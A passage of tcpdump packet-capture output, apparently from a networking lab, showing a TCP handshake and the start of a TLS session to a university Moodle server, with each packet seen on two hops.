	0x0040:  b775 c010 0000 0000 0103 0307            .u..........
IP (tos 0x0, ttl 63, id 18020, offset 0, flags [DF], proto TCP (6), length 60)
    198.7.0.3.33878 > 193.226.51.9.443: Flags [S], cksum 0xbb24 (incorrect -> 0x03b5), seq 3621697773, win 64240, options [mss 1460,sackOK,TS val 3077947408 ecr 0,nop,wscale 7], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 003c 4664 4000 3f06 3a62 c607 0003  E..<Fd@.?.:b....
	0x0020:  c1e2 3309 8456 01bb d7de b8ed 0000 0000  ..3..V..........
	0x0030:  a002 faf0 bb24 0000 0204 05b4 0402 080a  .....$..........
	0x0040:  b775 c010 0000 0000 0103 0307            .u..........
IP (tos 0x0, ttl 47, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [S.], cksum 0xe1cf (correct), seq 1484069536, ack 3621697774, win 5792, options [mss 1380,sackOK,TS val 2477391797 ecr 3077947408,nop,wscale 7], length 0
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 003c 0000 4000 2f06 90c6 c1e2 3309  E..<..@./.....3.
	0x0020:  c607 0003 01bb 8456 5875 1aa0 d7de b8ee  .......VXu......
	0x0030:  a012 16a0 e1cf 0000 0204 0564 0402 080a  ...........d....
	0x0040:  93a9 ffb5 b775 c010 0103 0307            .....u......
IP (tos 0x0, ttl 46, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [S.], cksum 0xe1d0 (correct), seq 1484069536, ack 3621697774, win 5792, options [mss 1380,sackOK,TS val 2477391797 ecr 3077947408,nop,wscale 7], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 003c 0000 4000 2e06 91c7 c1e2 3309  E..<..@.......3.
	0x0020:  c607 0002 01bb 8456 5875 1aa0 d7de b8ee  .......VXu......
	0x0030:  a012 16a0 e1d0 0000 0204 0564 0402 080a  ...........d....
	0x0040:  93a9 ffb5 b775 c010 0103 0307            .....u......
IP (tos 0x0, ttl 64, id 18021, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.2.33878 > 193.226.51.9.443: Flags [.], cksum 0xbb1b (incorrect -> 0x24e1), ack 1484069537, win 502, options [nop,nop,TS val 3077947430 ecr 2477391797], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0034 4665 4000 4006 396a c607 0002  E..4Fe@.@.9j....
	0x0020:  c1e2 3309 8456 01bb d7de b8ee 5875 1aa1  ..3..V......Xu..
	0x0030:  8010 01f6 bb1b 0000 0101 080a b775 c026  .............u.&
	0x0040:  93a9 ffb5                                ....
IP (tos 0x0, ttl 63, id 18021, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.3.33878 > 193.226.51.9.443: Flags [.], cksum 0xbb1c (incorrect -> 0x24e0), ack 1484069537, win 502, options [nop,nop,TS val 3077947430 ecr 2477391797], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 4665 4000 3f06 3a69 c607 0003  E..4Fe@.?.:i....
	0x0020:  c1e2 3309 8456 01bb d7de b8ee 5875 1aa1  ..3..V......Xu..
	0x0030:  8010 01f6 bb1c 0000 0101 080a b775 c026  .............u.&
	0x0040:  93a9 ffb5                                ....
IP (tos 0x0, ttl 64, id 18022, offset 0, flags [DF], proto TCP (6), length 569)
    198.7.0.2.33878 > 193.226.51.9.443: Flags [P.], cksum 0xbd20 (incorrect -> 0x0958), seq 3621697774:3621698291, ack 1484069537, win 502, options [nop,nop,TS val 3077947431 ecr 2477391797], length 517
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0239 4666 4000 4006 3764 c607 0002  E..9Ff@.@.7d....
	0x0020:  c1e2 3309 8456 01bb d7de b8ee 5875 1aa1  ..3..V......Xu..
	0x0030:  8018 01f6 bd20 0000 0101 080a b775 c027  .............u.'
	0x0040:  93a9 ffb5 1603 0102 0001 0001 fc03 0319  ................
	0x0050:  752c cf03 6533 c694 3033 4687 0562 efab  u,..e3..03F..b..
	0x0060:  be57 69bf 89f5 b33d a810 1bda 647d 9500  .Wi....=....d}..
	0x0070:  003a 1302 1303 1301 1304 c02c cca9 c0ad  .:.........,....
	0x0080:  c00a c02b c0ac c009 c030 cca8 c014 c02f  ...+.....0...../
	0x0090:  c013 009d c09d 0035 009c c09c 002f 009f  .......5...../..
	0x00a0:  ccaa c09f 0039 009e c09e 0033 0100 0199  .....9.....3....
	0x00b0:  0005 0005 0100 0000 0000 0a00 1600 1400  ................
	0x00c0:  1700 1800 1900 1d00 1e01 0001 0101 0201  ................
	0x00d0:  0301 0400 0b00 0201 0000 0d00 2200 2004  ............"...
	0x00e0:  0108 0908 0404 0308 0705 0108 0a08 0505  ................
	0x00f0:  0308 0806 0108 0b08 0606 0302 0102 0300  ................
	0x0100:  2300 0000 3300 6b00 6900 1700 4104 629e  #...3.k.i...A.b.
	0x0110:  186a 3723 455c 1943 b59f 7874 d3bd 808a  .j7#E\.C..xt....
	0x0120:  f2e1 769d a85e 4bcd bff7 84c9 4204 1fe0  ..v..^K.....B...
	0x0130:  daca 152f 03c2 335b 41b8 b48d 0bef 09ae  .../..3[A.......
	0x0140:  f376 baad 1118 ccf6 f33b f7be 9e56 001d  .v.......;...V..
	0x0150:  0020 70c2 8d39 fcb0 5c5f 824e dad5 3939  ..p..9..\_.N..99
	0x0160:  774b fcb9 4359 3731 9c39 08d7 f532 98ec  wK..CY71.9...2..
	0x0170:  252e 002b 0009 0803 0403 0303 0203 0100  %..+............
	0x0180:  3100 00ff 0100 0100 0000 0019 0017 0000  1...............
	0x0190:  146d 6f6f 646c 652e 666d 692e 756e 6962  .moodle.fmi.unib
	0x01a0:  7563 2e72 6f00 2d00 0302 0100 001c 0002  uc.ro.-.........
	0x01b0:  4001 0015 0093 0000 0000 0000 0000 0000  @...............
	0x01c0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x01d0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x01e0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x01f0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0200:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0210:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0220:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0230:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0240:  0000 0000 0000 0000 00                   .........
IP (tos 0x0, ttl 63, id 18022, offset 0, flags [DF], proto TCP (6), length 569)
    198.7.0.3.33878 > 193.226.51.9.443: Flags [P.], cksum 0xbd21 (incorrect -> 0x0957), seq 3621697774:3621698291, ack 1484069537, win 502, options [nop,nop,TS val 3077947431 ecr 2477391797], length 517
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0239 4666 4000 3f06 3863 c607 0003  E..9Ff@.?.8c....
	0x0020:  c1e2 3309 8456 01bb d7de b8ee 5875 1aa1  ..3..V......Xu..
	0x0030:  8018 01f6 bd21 0000 0101 080a b775 c027  .....!.......u.'
	0x0040:  93a9 ffb5 1603 0102 0001 0001 fc03 0319  ................
	0x0050:  752c cf03 6533 c694 3033 4687 0562 efab  u,..e3..03F..b..
	0x0060:  be57 69bf 89f5 b33d a810 1bda 647d 9500  .Wi....=....d}..
	0x0070:  003a 1302 1303 1301 1304 c02c cca9 c0ad  .:.........,....
	0x0080:  c00a c02b c0ac c009 c030 cca8 c014 c02f  ...+.....0...../
	0x0090:  c013 009d c09d 0035 009c c09c 002f 009f  .......5...../..
	0x00a0:  ccaa c09f 0039 009e c09e 0033 0100 0199  .....9.....3....
	0x00b0:  0005 0005 0100 0000 0000 0a00 1600 1400  ................
	0x00c0:  1700 1800 1900 1d00 1e01 0001 0101 0201  ................
	0x00d0:  0301 0400 0b00 0201 0000 0d00 2200 2004  ............"...
	0x00e0:  0108 0908 0404 0308 0705 0108 0a08 0505  ................
	0x00f0:  0308 0806 0108 0b08 0606 0302 0102 0300  ................
	0x0100:  2300 0000 3300 6b00 6900 1700 4104 629e  #...3.k.i...A.b.
	0x0110:  186a 3723 455c 1943 b59f 7874 d3bd 808a  .j7#E\.C..xt....
	0x0120:  f2e1 769d a85e 4bcd bff7 84c9 4204 1fe0  ..v..^K.....B...
	0x0130:  daca 152f 03c2 335b 41b8 b48d 0bef 09ae  .../..3[A.......
	0x0140:  f376 baad 1118 ccf6 f33b f7be 9e56 001d  .v.......;...V..
	0x0150:  0020 70c2 8d39 fcb0 5c5f 824e dad5 3939  ..p..9..\_.N..99
	0x0160:  774b fcb9 4359 3731 9c39 08d7 f532 98ec  wK..CY71.9...2..
	0x0170:  252e 002b 0009 0803 0403 0303 0203 0100  %..+............
	0x0180:  3100 00ff 0100 0100 0000 0019 0017 0000  1...............
	0x0190:  146d 6f6f 646c 652e 666d 692e 756e 6962  .moodle.fmi.unib
	0x01a0:  7563 2e72 6f00 2d00 0302 0100 001c 0002  uc.ro.-.........
	0x01b0:  4001 0015 0093 0000 0000 0000 0000 0000  @...............
	0x01c0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x01d0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x01e0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x01f0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0200:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0210:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0220:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0230:  0000 0000 0000 0000 0000 0000 0000 0000  ................
	0x0240:  0000 0000 0000 0000 00                   .........
IP (tos 0x0, ttl 47, id 64523, offset 0, flags [DF], proto TCP (6), length 52)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [.], cksum 0x2494 (correct), ack 3621698291, win 54, options [nop,nop,TS val 2477391803 ecr 3077947431], length 0
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 0034 fc0b 4000 2f06 94c2 c1e2 3309  E..4..@./.....3.
	0x0020:  c607 0003 01bb 8456 5875 1aa1 d7de baf3  .......VXu......
	0x0030:  8010 0036 2494 0000 0101 080a 93a9 ffbb  ...6$...........
	0x0040:  b775 c027                                .u.'
IP (tos 0x0, ttl 46, id 64523, offset 0, flags [DF], proto TCP (6), length 52)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [.], cksum 0x2495 (correct), ack 3621698291, win 54, options [nop,nop,TS val 2477391803 ecr 3077947431], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 fc0b 4000 2e06 95c3 c1e2 3309  E..4..@.......3.
	0x0020:  c607 0002 01bb 8456 5875 1aa1 d7de baf3  .......VXu......
	0x0030:  8010 0036 2495 0000 0101 080a 93a9 ffbb  ...6$...........
	0x0040:  b775 c027                                .u.'
IP (tos 0x0, ttl 47, id 64524, offset 0, flags [DF], proto TCP (6), length 1420)
    193.226.51.9.443 > 198.7.0.3.33878: Flags [.], cksum 0xe6c7 (correct), seq 1484069537:1484070905, ack 3621698291, win 54, options [nop,nop,TS val 2477391806 ecr 3077947431], length 1368
	0x0000:  0000 0001 0006 0242 31db f87f 0000 0800  .......B1.......
	0x0010:  4500 058c fc0c 4000 2f06 8f69 c1e2 3309  E.....@./..i..3.
	0x0020:  c607 0003 01bb 8456 5875 1aa1 d7de baf3  .......VXu......
	0x0030:  8010 0036 e6c7 0000 0101 080a 93a9 ffbe  ...6............
	0x0040:  b775 c027 1603 0100 3902 0000 3503 015e  .u.'....9...5..^
	0x0050:  fa14 a083 3cd6 a9c2 c891 42c4 f983 bedc  ....<.....B.....
	0x0060:  03b0 75e5 8a8a 0903 8853 0841 a102 1d00  ..u......S.A....
	0x0070:  0033 0000 0d00 0000 00ff 0100 0100 0023  .3.............#
	0x0080:  0000 1603 0105 6f0b 0005 6b00 0568 0005  ......o...k..h..
	0x0090:  6530 8205 6130 8204 49a0 0302 0102 0212  e0..a0..I.......
	0x00a0:  0301 4a5a 3271 3580 fc72 c626 d5c0 c1bd  ..JZ2q5..r.&....
	0x00b0:  fd39 300d 0609 2a86 4886 f70d 0101 0b05  .90...*.H.......
	0x00c0:  0030 4a31 0b30 0906 0355 0406 1302 5553  .0J1.0...U....US
	0x00d0:  3116 3014 0603 5504 0a13 0d4c 6574 2773  1.0...U....Let's
	0x00e0:  2045 6e63 7279 7074 3123 3021 0603 5504  .Encrypt1#0!..U.
	0x00f0:  0313 1a4c 6574 2773 2045 6e63 7279 7074  ...Let's.Encrypt
	0x0100:  2041 7574 686f 7269 7479 2058 3330 1e17  .Authority.X30..
	0x0110:  0d32 3030 3530 3432 3034 3233 305a 170d  .200504204230Z..
	0x0120:  3230 3038 3032 3230 3432 3330 5a30 1f31  200802204230Z0.1
	0x0130:  1d30 1b06 0355 0403 1314 6d6f 6f64 6c65  .0...U....moodle
	0x0140:  2e66 6d69 2e75 6e69 6275 632e 726f 3082  .fmi.unibuc.ro0.
	0x0150:  0122 300d 0609 2a86 4886 f70d 0101 0105  ."0...*.H.......
	0x0160:  0003 8201 0f00 3082 010a 0282 0101 00b6  ......0.........
	0x0170:  e542 337a 6b1b c78b 6f6f f237 dc1c 7933  .B3zk...oo.7..y3
	0x0180:  77c0 9a6d 9090 0a7b c2c2 13be a4cb d211  w..m...{........
	0x0190:  8077 e6ae adff 6c0b 967a 882b 9de2 adb7  .w....l..z.+....
	0x01a0:  fa74 f0b0 8662 b1f5 74fa e4dd 7908 4292  .t...b..t...y.B.
	0x01b0:  49c0 937b e0bc 46d3 3246 681a 1950 a2dd  I..{..F.2Fh..P..
	0x01c0:  881d 7849 52e5 0e28 0be7 ea9a 37cb f0f0  ..xIR..(....7...
	0x01d0:  1993 2a18 59b0 c362 a772 3f60 5d8c eba9  ..*.Y..b.r?`]...
	0x01e0:  7eda d0ea b9d7 a3f2 e3ef 0663 cba2 130f  ~..........c....
	0x01f0:  a623 6e5f 1bea 98e2 f191 c049 afd3 5e00  .#n_.......I..^.
	0x0200:  b8ff 58f9 dc62 2fca 0131 5d50 416b ea7c  ..X..b/..1]PAk.|
	0x0210:  01ec 973a 16dc 3a4c e6de 9487 eef4 9445  ...:..:L.......E
	0x0220:  546a 2611 93b7 9cb0 a4c4 8294 419a f423  Tj&.........A..#
	0x0230:  7509 f34c 2e4a bdd0 fa4e 2d0e aeaf bce2  u..L.J...N-.....
	0x0240:  1b8c 9360 43af 0e4e 232e 2ead 52a0 521b  ...`C..N#...R.R.
	0x0250:  2e3a 1d6b 650d 09b1 9fe9 b4a7 e894 f110  .:.ke...........
	0x0260:  1617 12ef 1c2c 3fe1 b20c 796c d96d 2f02  .....,?...yl.m/.
	0x0270:  0301 0001 a382 026a 3082 0266 300e 0603  .......j0..f0...
	0x0280:  551d 0f01 01ff 0404 0302 05a0 301d 0603  U...........0...
	0x0290:  551d 2504 1630 1406 082b 0601 0505 0703  U.%..0...+......
	0x02a0:  0106 082b 0601 0505 0703 0230 0c06 0355  ...+.......0...U
	0x02b0:  1d13 0101 ff04 0230 0030 1d06 0355 1d0e  .......0.0...U..
	0x02c0:  0416 0414 1d57 b7e9 8930 1961 8064 cbfb  .....W...0.a.d..
	0x02d0:  0ba0 a143 1b24 7c67 301f 0603 551d 2304  ...C.$|g0...U.#.
	0x02e0:  1830 1680 14a8 4a6a 6304 7ddd bae6 d139  .0....Jjc.}....9
	0x02f0:  b7a6 4565 eff3 a8ec a130 6f06 082b 0601  ..Ee.....0o..+..
	0x0300:  0505 0701 0104 6330 6130 2e06 082b 0601  ......c0a0...+..
	0x0310:  0505 0730 0186 2268 7474 703a 2f2f 6f63  ...0.."http://oc
	0x0320:  7370 2e69 6e74 2d78 332e 6c65 7473 656e  sp.int-x3.letsen
	0x0330:  6372 7970 742e 6f72 6730 2f06 082b 0601  crypt.org0/..+..
	0x0340:  0505 0730 0286 2368 7474 703a 2f2f 6365  ...0..#http://ce
	0x0350:  7274 2e69 6e74 2d78 332e 6c65 7473 656e  rt.int-x3.letsen
	0x0360:  6372 7970 742e 6f72 672f 301f 0603 551d  crypt.org/0...U.
	0x0370:  1104 1830 1682 146d 6f6f 646c 652e 666d  ...0...moodle.fm
	0x0380:  692e 756e 6962 7563 2e72 6f30 4c06 0355  i.unibuc.ro0L..U
	0x0390:  1d20 0445 3043 3008 0606 6781 0c01 0201  ...E0C0...g.....
	0x03a0:  3037 060b 2b06 0104 0182 df13 0101 0130  07..+..........0
	0x03b0:  2830 2606 082b 0601 0505 0702 0116 1a68  (0&..+.........h
	0x03c0:  7474 703a 2f2f 6370 732e 6c65 7473 656e  ttp://cps.letsen
	0x03d0:  6372 7970 742e 6f72 6730 8201 0506 0a2b  crypt.org0.....+
	0x03e0:  0601 0401 d679 0204 0204 81f6 0481 f300  .....y..........
	0x03f0:  f100 7700 b21e 05cc 8ba2 cd8a 204e 8766  ..w..........N.f
	0x0400:  f92b b98a 2520 676b dafa 70e7 b249 532d  .+..%.gk..p..IS-
	0x0410:  ef8b 905e 0000 0171 e1a3 f30f 0000 0403  ...^...q........
	0x0420:  0048 3046 0221 00f1 9548 9c24 43e0 6340  .H0F.!...H.$C.c@
	0x0430:  0342 6770 1b72 ac7b 8465 d4c7 9a57 7f48  .Bgp.r.{.e...W.H
	0x0440:  c99f cc29 a612 5102 2100 d87d ba1a c0bc  ...)..Q.!..}....
	0x0450:  0d79 989f 41a8 d50a 77f0 8f76 ed03 2e10  .y..A...w..v....
	0x0460:  6a99 07ac c65d b71e c769 0076 006f 5376  j....]...i.v.oSv
	0x0470:  ac31 f031 19d8 9900 a451 15ff 7715 1c11  .1.1.....Q..w...
	0x0480:  d902 c100 2906 8db2 089a 37d9 1300 0001  ....).....7.....
	0x0490:  71e1 a3f3 8200 0004 0300 4730 4502 2100  q.........G0E.!.
	0x04a0:  a3b5 a25b 82c4 7f85 3d4a 92b4 88cb 0342  ...[....=J.....B
	0x04b0:  0888 d35c aaa4 f07d 3213 cbcb 4dfc 0f3c  ...\...}2...M..<
	0x04c0:  0220 2598 05e5 0677 8820 e178 4c8c 54e0  ..%....w...xL.T.
	0x04d0:  7f85 9529 cf4e 34ac de4f 1a1f 6fda 47eb  ...).N4..O..o.G.
	0x04e0:  0562 300d 0609 2a86 4886 f70d 0101 0b05  .b0...*.H.......
	0x04f0:  0003 8201 0100 02ac 20e6 562b 562c f7a5  ..........V+V,..
	0x0500:  8dbb f8e8 2e3f 1cfa f7a6 de48 0f9d f056  .....?.....H...V
	0x0510:  236e 7bd4 5eec d3b5 1972 0fa7 0817 f1fc  #n{.^....r......
	0x0520:  2488 f50e 8cb2 64c6 1563 a70a 33a3 84db  $.....d..c..3...
	0x0530:  cd80 7739 1b2b c0d3 8dd8 ed43 3753 af75  ..w9.+.....C7S.u
	0x0540:  e0f4 1247 0e61 0b49 22c1 05a3 4aa9 16d3  ...G.a.I"...J...
	0x0550:  cb33 b617 6d49 6182 099e 67e3 5ad6 8cae  .3..mIa...g.Z...
	0x0560:  3e02 1fd9 85ed 4858 fd74 8bad ed03 87dc  >.....HX.t......
	0x0570:  7264 5ade 239d 4ba0 5557 8cf7 a740 3264  rdZ.#.K.UW...@2d
	0x0580:  c3f0 7d38 22ad bd48 7ef0 b775 366f 6e05  ..}8"..H~..u6on.
	0x0590:  2573 13ee 6897 528f 87aa efd1            %s..h.R.....
IP (tos 0x0, ttl 46, id 64524, offset 0, flags [DF], proto TCP (6), length 1420)
    193.226.51.9.443 > 198.7.0.2.33878: Flags [.], cksum 0xe6c8 (correct), seq 1484069537:1484070905, ack 3621698291, win 54, options [nop,nop,TS val 2477391806 ecr 3077947431], length 1368
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 058c fc0c 4000 2e06 906a c1e2 3309  E.....@....j..3.
	0x0020:  c607 0002 01bb 8456 5875 1aa1 d7de baf3  .......VXu......
	0x0030:  8010 0036 e6c8 0000 0101 080a 93a9 ffbe  ...6............
	0x0040:  b775 c027 1603 0100 3902 0000 3503 015e  .u.'....9...5..^
	0x0050:  fa14 a083 3cd6 a9c2 c891 42c4 f983 bedc  ....<.....B.....
	0x0060:  03b0 75e5 8a8a 0903 8853 0841 a102 1d00  ..u......S.A....
	0x0070:  0033 0000 0d00 0000 00ff 0100 0100 0023  .3.............#
	0x0080:  0000 1603 0105 6f0b 0005 6b00 0568 0005  ......o...k..h..
	0x0090:  6530 8205 6130 8204 49a0 0302 0102 0212  e0..a0..I.......
	0x00a0:  0301 4a5a 3271 3580 fc72 c626 d5c0 c1bd  ..JZ2q5..r.&....
	0x00b0:  fd39 300d 0609 2a86 4886 f70d 0101 0b05  .90...*.H.......
	0x00c0:  0030 4a31 0b30 0906 0355 0406 1302 5553  .0J1.0...U....US
	0x00d0:  3116 3014 0603 5504 0a13 0d4c 6574 2773  1.0...U....Let's
	0x00e0:  2045 6e63 7279 7074 3123 3021 0603 5504  .Encrypt1#0!..U.
	0x00f0:  0313 1a4c 6574 2773 2045 6e63 7279 7074  ...Let's.Encrypt
	0x0100:  2041 7574 686f 7269 7479 2058 3330 1e17  .Authority.X30..
	0x0110:  0d32 3030 3530 3432 3034 3233 305a 170d  .200504204230Z..
	0x0120:  3230 3038 3032 3230 3432 3330 5a30 1f31  200802204230Z0.1
	0x0130:  1d30 1b06 0355 0403 1314 6d6f 6f64 6c65  .0...U....moodle
	0x0140:  2e66 6d69 2e75 6e69 6275 632e 726f 3082  .fmi.unibuc.ro0.
	0x0150:  0122 300d 0609 2a86 4886 f70d 0101 0105  ."0...*.H.......
	0x0160:  0003 8201 0f00 3082 010a 0282 0101 00b6  ......0.........
	0x0170:  e542 337a 6b1b c78b 6f6f f237 dc1c 7933  .B3zk...oo.7..y3
	0x0180:  77c0 9a6d 9090 0a7b c2c2 13be a4cb d211  w..m...{........
	0x0190:  8077 e6ae adff 6c0b 967a 882b 9de2 adb7  .w....l..z.+....
	0x01a0:  fa74 f0b0 8662 b1f5 74fa e4dd 7908 4292  .t...b..t...y.B.
	0x01b0:  49c0 937b e0bc 46d3 3246 681a 1950 a2dd  I..{..F.2Fh..P..
	0x01c0:  881d 7849 52e5 0e28 0be7 ea9a 37cb f0f0  ..xIR..(....7...
	0x01d0:  1993 2a18 59b0 c362 a772 3f60 5d8c eba9  ..*.Y..b.r?`]...
	0x01e0:  7eda d0ea b9d7 a3f2 e3ef 0663 cba2 130f  ~..........c....
	0x01f0:  a623 6e5f 1bea 98e2 f191 c049 afd3 5e00  .#n_.......I..^.
	0x0200:  b8ff 58f9 dc62 2fca 0131 5d50 416b ea7c  ..X..b/..1]PAk.|
	0x0210:  01ec 973a 16dc 3a4c e6de 9487 eef4 9445  ...:..:L.......E
	0x0220:  546a 2611 93b7 9cb0 a4c4 8294 419a f423  Tj&.........A..#
	0x0230:  7509 f34c 2e4a bdd0 fa4e 2d0e aeaf bce2  u..L.J...N-.....
	0x0240:  1b8c 9360 43af 0e4e 232e 2ead 52a0 521b  ...`C..N#...R.R.
	0x0250:  2e3a 1d6b 650d 09b1 9fe9 b4a7 e894 f110  .:.ke...........
	0x0260:  1617 12ef 1c2c 3fe1 b20c 796c d96d 2f02  .....,?...yl.m/.
	0x0270:  0301 0001 a382 026a 3082 0266 300e 0603  .......j0..f0...
	0x0280:  551d 0f01 01ff 0404 0302 05a0 301d 0603  U...........0...
	0x0290:  551d 2504 1630 1406 082b 0601 0505 0703  U.%..0...+......
	0x02a0:  0106 082b 0601 0505 0703 0230 0c06 0355  ...+.......0...U
	0x02b0:  1d13 0101 ff04 0230 0030 1d06 0355 1d0e  .......0.0...U..
	0x02c0:  0416 0414 1d57 b7e9 8930 1961 8064 cbfb  .....W...0.a.d..
	0x02d0:  0ba0 a143 1b24 7c67 301f 0603 551d 2304  ...C.$|g0...U.#.
	0x02e0:  1830 1680 14a8 4a6a 6304 7ddd bae6 d139  .0....Jjc.}....9
	0x02f0:  b7a6 4565 eff3 a8ec a130 6f06 082b 0601  ..Ee.....0o..+..
	0x0300:  0505 0701 0104 6330 6130 2e06 082b 0601  ......c0a0...+..
	0x0310:  0505 0730 0186 2268 7474 703a 2f2f 6f63  ...0.."http://oc
	0x0320:  7370 2e69 6e74 2d78 332e 6c65 7473 656e  sp.int-x3.letsen
	0x0330:  6372 7970 742e 6f72 6730 2f06 082b 0601  crypt.org0/..+..
	0x0340:  0505 0730 0286 2368 7474 703a 2f2f 6365  ...0..#http://ce
	0x0350:  7274 2e69 6e74 2d78 332e 6c65 7473 656e  rt.int-x3.letsen
	0x0360:  6372 7970 742e 6f72 672f 301f 0603 551d  crypt.org/0...U.
	0x0370:  1104 1830 1682 146d 6f6f 646c 652e 666d  ...0...moodle.fm
	0x0380:  692e 756e 6962 7563 2e72 6f30 4c06 0355  i.unibuc.ro0L..U
	0x0390:  1d20 0445 3043 3008 0606 6781 0c01 0201  ...E0C0...g.....
	0x03a0:  3037 060b 2b06 0104 0182 df13 0101 0130  07..+..........0
	0x03b0:  2830 2606 082b 0601 0505 0702 0116 1a68  (0&..+.........h
	0x03c0:  7474 703a 2f2f 6370 732e 6c65 7473 656e  ttp://cps.letsen
	0x03d0:  6372 7970 742e 6f72 6730 8201 0506 0a2b  crypt.org0.....+
	0x03e0:  0601 0401 d679 0204 0204 81f6 0481 f300  .....y..........
	0x03f0:  f100 7700 b21e 05cc 8ba2 cd8a 204e 8766  ..w..........N.f
	0x0400:  f92b b98a 2520 676b dafa 70e7 b249 532d  .+..%.gk..p..IS-
	0x0410:  ef8b 905e 0000 0171 e1a3 f30f 0000 0403  ...^...q........
	0x0420:  0048 3046 0221 00f1 9548 9c24 43e0 6340  .H0F.!...H.$C.c@
	0x0430:  0342 6770 1b72 ac7b 8465 d4c7 9a57 7f48  .Bgp.r.{.e...W.H
	0x0440:  c99f cc29 a612 5102 2100 d87d ba1a c0bc  ...)..Q.!..}....
	0x0450:  0d79 989f 41a8 d50a 77f0 8f76 ed03 2e10  .y..A...w..v....
	0x0460:  6a99 07ac c65d b71e c769 0076 006f 5376  j....]...i.v.oSv
	0x0470:  ac31 f031 19d8 9900 a451 15ff 7715 1c11  .1.1.....Q..w...
	0x0480:  d902 c100 2906 8db2 089a 37d9 1300 0001  ....).....7.....
	0x0490:  71e1 a3f3 8200 0004 0300 4730 4502 2100  q.........G0E.!.
	0x04a0:  a3b5 a25b 82c4 7f85 3d4a 92b4 88cb 0342  ...[....=J.....B
	0x04b0:  0888 d35c aaa4 f07d 3213 cbcb 4dfc 0f3c  ...\...}2...M..<
	0x04c0:  0220 2598 05e5 0677 8820 e178 4c8c 54e0  ..%....w...xL.T.
	0x04d0:  7f85 9529 cf4e 34ac de4f 1a1f 6fda 47eb  ...).N4..O..o.G.
	0x04e0:  0562 300d 0609 2a86 4886 f70d 0101 0b05  .b0...*.H.......
	0x04f0:  0003 8201 0100 02ac 20e6 562b 562c f7a5  ..........V+V,..
	0x0500:  8dbb f8e8 2e3f 1cfa f7a6 de48 0f9d f056  .....?.....H...V
	0x0510:  236e 7bd4 5eec d3b5 1972 0fa7 0817 f1fc  #n{.^....r......
	0x0520:  2488 f50e 8cb2 64c6 1563 a70a 33a3 84db  $.....d..c..3...
	0x0530:  cd80 7739 1b2b c0d3 8dd8 ed43 3753 af75  ..w9.+.....C7S.u
	0x0540:  e0f4 1247 0e61 0b49 22c1 05a3 4aa9 16d3  ...G.a.I"...J...
	0x0550:  cb33 b617 6d49 6182 099e 67e3 5ad6 8cae  .3..mIa...g.Z...
	0x0560:  3e02 1fd9 85ed 4858 fd74 8bad ed03 87dc  >.....HX.t......
	0x0570:  7264 5ade 239d 4ba0 5557 8cf7 a740 3264  rdZ.#.K.UW...@2d
	0x0580:  c3f0 7d38 22ad bd48 7ef0 b775 366f 6e05  ..}8"..H~..u6on.
	0x0590:  2573 13ee 6897 528f 87aa efd1            %s..h.R.....
IP (tos 0x0, ttl 64, id 18023, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.2.33878 > 193.226.51.9.443: Flags [.], cksum 0xbb1b (incorrect -> 0x1d61), ack 1484070905, win 493, options [nop,nop,TS val 3077947465 ecr 2477391806], length 0
	0x0000:  0000 0001 0006 0242 c607 0002 0000 0800  .......B........
	0x0010:  4500 0034 4667 4000 4006 3968 c607 0002  E..4Fg@.@.9h....
	0x0020:  c1e2 3309 8456 01bb d7de baf3 5875 1ff9  ..3..V......Xu..
	0x0030:  8010 01ed bb1b 0000 0101 080a b775 c049  .............u.I
	0x0040:  93a9 ffbe                                ....
IP (tos 0x0, ttl 63, id 18023, offset 0, flags [DF], proto TCP (6), length 52)
    198.7.0.3.33878 > 193.226.51.9.443: Flags [.], cksum 0xbb1c (incorrect -> 0x1d60), ack 1484070905, win 493, options [nop,nop,TS val 3077947465 ecr 2477391806], length 0
	0x0000:  0004 0001 0006 0242 c607 0003 0000 0800  .......B........
	0x0010:  4500 0034 4667 4000 3f06 3a67 c607 0003  E..4Fg@.?.:g....
	0x0020:  c1e2 3309 8456 01bb d7de baf3 5875 1ff9  ..3..V......Xu..
	0x0030:  8010 01ed bb1c 0000 0101 080a b775 c049  .............u.I
	0x0040:  93a9 ffbe                                ....
IP (tos 0x0, ttl 47, id 64525, offset 0, flags [DF], proto TCP (6), length 681)
